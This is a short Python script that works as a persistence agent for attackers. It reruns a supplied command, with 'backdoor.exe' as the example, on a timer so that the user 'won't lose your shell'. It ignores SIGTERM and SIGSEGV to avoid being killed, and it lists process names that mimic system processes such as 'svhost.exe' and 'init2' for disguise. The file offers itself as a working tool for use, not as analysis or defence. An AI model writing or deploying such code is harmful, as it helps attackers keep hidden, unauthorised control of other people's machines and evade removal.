#!/usr/bin/env python
import os, sys
import signal
from time import sleep

LINUX_DISGUISE_PROCESS_NAMES = ['init2', 'login', '/usr/lib/gvfs/dvfsd', '/usr/lib/ibus/ibus-dconf']
WINDOWS_DISGUISE_PROCESS_NAMES = ['winmanager.exe', 'svhost.exe', 'wmi.exe', 'logon.exe']
DEFAULT_SLEEP_TIMER = 30


def get_arguments():
    if len(sys.argv) < 2:
        print("Use this script to create a tiny agent that will periodically rerun your cmd command "
              "with a specified sleep timer, so you won't lose your shell anymore.")
        print("Usage: " + sys.argv[0] + " 30 " + '"C:\\WINDOWS\\system32\\backdoor.exe"')
        print("Usage: " + sys.argv[0] + " " + '"C:\\WINDOWS\\system32\\backdoor.exe"')
    sleep_timer = sys.argv[1]
    try:
        sleep_timer = int(sleep_timer)
        cmd = sys.argv[2]
    except:
        sleep_timer = DEFAULT_SLEEP_TIMER
        cmd = sys.argv[1]
    return sleep_timer, cmd


def handle_signal(signal_number, frame):
    print('Dodging SIGTERM signal from the kernel')
    return


def execute_command(cmd):
    try:
        os.system(cmd)
    except:
        print("Command execution failed: " + cmd)


def work_forever(cmd, sleep_timer_in_seconds):
    while True:
        print('Running ' + cmd)
        execute_command(cmd)
        print('Sleeping for ' + str(sleep_timer_in_seconds) + ' seconds')
        sleep(sleep_timer_in_seconds)


# 1 - OVERRIDE THE KERNEL SIGNAL HANDLERS
signal.signal(signal.SIGTERM, handle_signal)
signal.signal(signal.SIGSEGV, handle_signal)

# 2 - START THE AGENT
sleep_timer, cmd = get_arguments()
work_forever(cmd, sleep_timer)
